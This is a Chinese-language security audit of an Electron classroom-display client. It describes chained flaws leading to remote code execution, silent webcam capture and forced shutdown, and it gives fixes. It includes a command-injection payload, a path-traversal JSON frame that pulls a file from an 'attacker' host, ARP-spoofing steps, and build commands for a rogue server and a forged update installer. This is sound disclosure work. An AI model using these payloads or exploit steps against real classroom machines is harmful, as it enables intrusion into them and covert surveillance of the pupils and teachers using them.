# 教室小喇叭AI助手 v1.2.1 安全分析报告

**分析对象**: `<客户端安装目录>\` — Electron 桌面客户端(教室大屏端),authoritative version 1.2.1
**分析方法**: app.asar 解包源码审计(全部 main.js 15512 行 + renderer + utils + node_modules 关键路径)
**分析日期**: 2025-09
**结论**: 存在多条可稳定复现、可远程利用的高危漏洞链,组合可达 **远程任意代码执行(RCE)、任意文件读写、静默监控(摄像头/屏幕)、拒绝教学(锁机/关机)**。

> 所有路径引用均为解包后源码位置,主进程源码 = app.asar→`main.js`。

---

## 0. 攻击面总览

客户端是"教室端大屏",安装于教室电脑,通过 WebSocket 网关(wss://xlb.810086.com/ws)长期在线接收教师指令。关键信任决策几乎全部落在**传输层与服务器**,客户端自身不做二次校验:

```
教师端 ──► 服务器 ──► wss──► 教室客户端(main.js, nodeIntegration:true)
                              ├─ broadcast.message → executeRemoteSystemControlAction()  ←命令执行面
                              ├─ broadcast.message(type=file) → 任意URL下载+打印        ←文件写入面
                              ├─ renderer.pack.push → 热更新页面                        ←代码面
                              └─ desktop.update.* → electron-updater                    ←安装包面
```

**攻击前提等级**(对应漏洞编号):

| 等级 | 前提 | 对应漏洞 |
|---|---|---|
| A | 同网段 MITM(DNS/ARP 欺骗即可,无需密码) | TLS-1, RCE-2, FILE-1/2, AUTH-1 |
| B | 已知 classId + classCode(班级口令,常贴在教室墙上/被学生共享) | RCE-1, GATE-1, PRIV-1 |
| C | 服务器或其更新源被控(供应链) | RCE-3, RCE-4 |
| — | 无任何前提(本地横) | AUTH-2, RCE-5, LOCAL-1 |

---

## 1. TLS-1 全局关闭 TLS 校验【高危 · A】

**位置**: main.js:204 与 656
```js
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
```
**原理**: 该环境变量使 Node.js 所有 TLS 连接(axios/https/WebSocket/electron-updater 的 HTTPS 拉取)**不校验证书链**。虽部分单点请求显式写了 `rejectUnauthorized: true`,但该参数在全局变量已污染 + axios 全局拦截缺失的环境下无法恢复安全:更关键的是 electron-updater 的 HTTPS 下载、WebSocket 网关连接、以及所有未显式覆盖的请求全部裸奔。
**影响**: 同网段攻击者用自签证书即可完整劫持客户端与服务器的全部通信(登录 token、学生数据、广播指令、更新包)。
**复现**: `mitmproxy --mode transparent` + ARP 欺骗;客户端一切 HTTPS 流量可解密。

---

## 2. AUTH-1 设备注册零认证【高危 · A/B】

**位置**: main.js:2114 `/api/v2/devices/register`;header 构造 main.js:1904
**原理**: 设备注册/心跳使用 `Authorization: Bearer <classToken 或 sessionToken>`,而 classToken 即班级口令。服务端若接受即签发 `deviceToken`,客户端随后用它做网关身份(`type:'identity'`, main.js:6722-6733),**对 token 的正确性验证完全委托给传输对端**。配合 TLS-1,MITM 可直接冒充服务器签发任意身份。
**影响**: 冒充任意班级设备,接入实时指令通道。

---

## 3. GATE-1 广播指令通道 = 远程控制通道【严重 · A/B/C】

**位置**: main.js:6560-6600(broadcast.message 处理)→ main.js:4512 `executeRemoteSystemControlAction()`
**原理**: 任何来自网关的 `broadcast.message` 且 `messageType === 'command'` 的帧,其 `command` 字段直接进入 `executeRemoteSystemControlAction()`,支持动作:
- `lock_system` → `exec('rundll32.exe user32.dll,LockWorkStation')`(main.js:4601)
- `shutdown_system` → 120 秒倒计时后 `exec('shutdown.exe /s /t 0')`(main.js:3325)
- `lock_app/unlock_app` → kiosk 全屏锁(可带教师自定义解锁码)
- `launch_app` → 从白名单启动应用(无注入,但配合其他链可滥用)
- `smart-attendance:snapshot/start` → **静默抓拍摄像头**(见 PRIV-1)
- `desktop_update_force` → 触发自动更新链(见 RCE-3/4)

**去重机制**(`wasBroadcastProcessed`)只按 messageId,新消息 ID 即重放。
**影响**: 拿到通道即可对教室电脑执行锁屏/关机/静默监控。
**PoC**: `rogue_server.py` 攻击编号 1/2/3/6。

---

## 4. RCE-2 edge-tts 命令注入 → 远程代码执行【严重 · A/B/C】

**位置**:
- 注入点: `utils/edge-tts.js:141`
  ```js
  const command = `npx edge-tts --voice "${voiceName}" --rate="${rateStr}" --volume="${volumeStr}" --text "${escapedText}" --write-media "${audioFile}"`;
  exec(command, ...)
  ```
- 转义缺陷: 138 行 `text.replace(/"/g, '\\"')` 仅转义双引号 —— 在 Windows `cmd.exe` 中 `\"` **不阻止引号闭合**(cmd 的引号规则与 POSIX 不同),`&`、`|`、`` ` `` 等元字符可 break out。
- 触发链: 教师广播文本 → `banner.html:544 speakText()` → `ipcRenderer.send('tts-speak')` → main.js:8745 `tts-speak` 处理器 → 云 TTS 失败(或 MITM 使其失败)→ **fallback 到本地 edge-tts** → `exec(command)`。
- 广播文本任意(经网关下发),enableTTS 由服务端控制。
**PoC payload**(rogue_server.py 攻击 5):
```
你好\" & start calc & \"
```
**影响**: 任意命令执行,当前用户权限;教室端常为常驻管理员会话,影响等同于内网立足点。

---

## 5. FILE-1 广播文件下载路径穿越 → 任意路径静默写文件【高危 · A/B/C】

**位置**:
- 下载入口: main.js:12478 `processMessageData()` → `handleFileDownload()` (main.js:12500)
- 路径拼接: main.js:12530
  ```js
  const filePath = path.join(downloadPath, messageData.fileName || `download_${Date.now()}`);
  ```
- 写入: main.js:12957 `fs.createWriteStream(filePath)`;URL 来自 `messageData.content`,支持 http/https 与 302 跟随(main.js:12904)。
**缺陷**: `messageData.fileName` 完全由服务端/网关控制,**未做 basename 清洗、未防 `..`**。`path.join` 不拒绝 `..` 段。
**PoC**(rogue_server.py 攻击 4):
```json
{
  "type": "broadcast.message", "messageType": "file",
  "fileName": "..\\..\\..\\..\\Users\\Public\\xlb_pwned.txt",
  "content": "http://attacker/pwned.txt"
}
```
**影响**:
- 静默写任意路径(桌面/启动项/计划任务目录)——客户端下载落点默认桌面,进程有 UI 权限
- 配合 `enablePrinting=true` 可让文件被打印,形成"物理世界"骚扰/泄密
- 可投递到 Windows 启动目录实现持久化(`Users\Public\Startup` 需管理员;`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 当前用户即可)

---

## 6. RCE-3 伪造更新链(electron-updater)→ 静默执行任意 exe【严重 · A/C】

**三重缺陷叠加**:

1. **验签模块是死代码**: `utils/update-verifier.js` 实现了 Ed25519 对下载安装包的签名验证,**但 main.js 中 0 次引用**(grep `require('./utils/update-verifier')` 于 main.js 无结果)。开发者写了防护,忘了接上。
2. **electron-updater Authenticode 校验被禁用**: `resources/app-update.yml` 无 `publisherName` 字段 → electron-updater 6.6.2 `NsisUpdater.verifySignature()`(out/NsisUpdater.js:84-99)直接 `return null`,跳过 Windows 代码签名验证。
3. **更新源可被指向任意服务器**: feed URL 由 `getServerOrigin()` 拼出(main.js:410),配合 TLS-1 或环境变量重定向即可指向攻击者。

**触发方式**: 网关下发 `desktop_update_force`(main.js:4530 `handleDesktopUpdatePush`)或 `renderer.pack.push` 后自动检查;`desktopUpdateAutoInstallAfterDownload` 默认 true,下载完成后 3 秒自动 `quitAndInstall`(main.js:537-544)。

**利用步骤**:
1. MITM 劫持 `POST /api/v2/download/desktop/check-update` 返回 `updateAvailable:true`
2. 提供 `latest.yml` 指向恶意 exe(无需签名)
3. 客户端下载、静默关闭所有窗口、执行

**PoC**: `rogue_server.py --update-rce` + `installer.go` 编译产物。攻击编号 8。
**影响**: 远程任意代码执行,等同于完全控制教室电脑。

---

## 7. RCE-4 渲染层热更新(签名可选)→ 持久代码注入【高危 · A/C】

**位置**: `utils/renderer-pack.js`
**原理**: 服务器可推送 `renderer.pack.push` 触发 renderer 热更新(main.js:6514)。该模块**有** Ed25519 验签(utils/renderer-pack.js:85),但:
- `latest.json` 中的 `sha512` 字段**是可选的**(221 行 `if (latest.sha512)`),只签 pack 二进制,latest.json 本身未签 → MITM 可改 latest.json 指向旧版 pack(version-mismatch 防了降级,但不防"当前已签过的旧包重放到不同 classId")
- 关键: **验签公钥与 RCE-3 是同一把**,一旦 RCE-3 的私钥泄露或被替换,渲染层同样沦陷
- **签名验证通过后,pack 内容是 renderer/ 下的 HTML/JS,会在 `nodeIntegration:true, contextIsolation:false` 的窗口中执行** → 一旦签名密钥或服务器被控,任意 JS 直接拥有 Node 权限
**影响**: 供应链级持久化注入;与 RCE-3 同根。

---

## 8. AUTH-2 应用锁"万能解锁码"硬编码【中危 · 本地】

**位置**: main.js:4085
```js
process.env.DESKTOP_APP_LOCK_MASTER_UNLOCK_CODE
  || desktopRuntime.appLockMasterUnlockCode
  || '810086'
```
**影响**: 教师设置 lock_app 锁定学生端后,任何人输入 `810086` 即可解锁,锁控机制形同虚设。同时该数字与公司域名后缀一致,极易被学生猜测/传播。

---

## 9. PRIV-1 静默摄像头抓拍【高危 · A/B/C】

**位置**:
- 指令入口: main.js:4517 `smart-attendance:snapshot` → `openSmartAttendanceAutoSession`(4733)
- 窗口属性: main.js:4770 `show:false, skipTaskbar:true`(完全不可见)
- 抓拍: renderer/smart-attendance.html:760 `getUserMedia({video:{1920x1080}})` → canvas.toDataURL → main.js:15147 `smart-attendance-upload-snapshot` 上传服务器
**影响**: 无需教室端任何 UI 提示或同意,远程静默抓拍教室摄像头画面(师生人脸),上传到服务器。配合 GATE-1 可被任何能进通道的人触发。**合规风险高(个人信息保护法/GDPR-class)**。
**PoC**: rogue_server.py 攻击 6。

---

## 10. FILE-2 静默下载/打印【中危 · A/B/C】

**位置**: main.js:12500-12570
**原理**: 广播 `type=file` 且 `enablePrinting=true` 时,客户端自动下载并调用 PowerShell `ShellExecute(file,"print")`(main.js:13160, 14011)向默认打印机静默打印。可被用于:
- 强制教室打印机打印攻击者内容(物理骚扰/浪费)
- 与 FILE-1 组合: 任意 URL → 任意路径 + 打印机执行(受限)

---

## 11. LOCAL-1 本地 JS 注入(信息泄露辅助)【低危】

renderer 窗口普遍 `nodeIntegration:true, contextIsolation:false`(main.js:5338, 7150, 11321, ...)且 `webSecurity:false` 多处。banner.html 等对 `data.content`/`data.sender` 有 escapeHtml 防护,**但 `broadcast-home.html:3936` 直接 `window.open().document.write()` 插入 `data.content`,以及 `image-viewer`、`data.content` 的 `img.src`/`audio.src`/`video.src` 直接赋值** — 若攻击者已可注入广播消息,可进一步在主窗口 iframe 中执行 JS(Node 权限)。
作为独立漏洞被 CSRF/XSS 触发的前提是已有通道;主要作为**漏洞链放大器**。

---

## 12. 漏洞链组合(利用场景)

### 场景 A: 同网段学生/访客(等级 A)
```
ARP 欺骗 → TLS-1 解密 → 冒充服务器(AUTH-1 零验证)
       ├─ GATE-1: 下发 lock_system/shutdown → 教学瘫痪
       ├─ PRIV-1: 静默抓拍教室摄像头
       ├─ FILE-1: 路径穿越写启动项 → 持久化
       ├─ RCE-2: TTS 注入 → 直接 RCE
       └─ RCE-3: 伪造更新 → 直接 RCE(完全控制)
```
**最快 RCE 路径: RCE-2(一步) 或 RCE-3(两步) → 完全控制。**

### 场景 B: 已知班级口令(等级 B)
教师端/学生端泄露 classCode 常见(贴教室、班级群共享)。攻击者可远程接入网关冒充教师端广播任意指令,无需物理同网段。

### 场景 C: 供应链(等级 C)
服务器 xlb.810086.com 被控(或其 DNS/CDN 被劫持)→ 全量设备静默 RCE(约"十万台"规模,见 renderer-pack.js 注释)。

---

## 13. PoC 文件说明

```
outputs/jsxlb/poc/
├── rogue_server.py       恶意后端(菜单式攻击)
├── installer.go          伪造更新安装包(go build)
├── start_rogue_lab.bat   一键复现环境(环境变量重定向)
└── README.md             使用说明
```
**运行**:
```
pip install aiohttp
go build -ldflags "-H=windowsgui" -o installer.exe installer.go
start_rogue_lab.bat
```
客户端启动后自动连入 rogue server 控制台,输入 1-8 触发对应攻击。MITM 变体见 README。

---

## 14. 修复建议(按优先级)

1. **[P0] 移除 `NODE_TLS_REJECT_UNAUTHORIZED='0'`** — 一切安全性的前提
2. **[P0] 接通 update-verifier.js** — main.js 必须引入并调用 `verifyDownloadedUpdate()`;app-update.yml 添加 `publisherName` 启用 Authenticode 双重校验
3. **[P0] edge-tts 注入修复** — 弃用 `exec` 字符串拼接,改 `execFile('npx', ['edge-tts', '--text', text, ...])`(参数数组,零转义)
4. **[P0] FILE-1 路径清洗** — `fileName = path.basename(fileName)` + 校验 `!filePath.startsWith(downloadPath)`(可参考 utils/file-transfer-store.js 里已实现的安全做法)
5. **[P1] 移除硬编码 master unlock code** `'810086'`;改为服务端下发或完全移除
6. **[P1] 静默摄像头抓拍增加本地可见提示**(指示灯/横幅),或改为服务端显式审计授权
7. **[P1] renderer.pack latest.json 也纳入签名**;sha512 字段强制必填
8. **[P2] renderer 全面启用 `contextIsolation:true`,移除 `webSecurity:false`**
9. **[P2] 网关指令帧加入 HMAC/时间戳,防重放;指令白名单下沉到客户端而非依赖服务器**

---

## 附录: 关键证据行号速查

| 漏洞 | 文件:行 |
|---|---|
| TLS 关闭 | main.js:204, 656 |
| 服务器 URL 可重定向 | main.js:1669 |
| 设备注册 | main.js:2114 |
| 网关 identity(不校验 token 内容) | main.js:6722 |
| broadcast→command 分发 | main.js:6569-6590 |
| executeRemoteSystemControlAction | main.js:4512 |
| lock_system(rundll32) | main.js:4601 |
| shutdown(120s 后执行) | main.js:3325, 3379 |
| TTS exec 注入 | utils/edge-tts.js:138-141 |
| 文件下载路径拼接 | main.js:12530 |
| 302 跟随+写文件 | main.js:12904, 12957 |
| 静默打印 PowerShell | main.js:13160, 14011 |
| update-verifier 死代码 | utils/update-verifier.js(全文件),main.js 0 引用 |
| app-update.yml 无 publisherName | resources/app-update.yml |
| 静默摄像头窗口 | main.js:4770 (show:false) |
| 硬编码万能码 | main.js:4085 |
| nodeIntegration:true(多处) | main.js:1452, 2810, 5338, 7150, 11321 … |
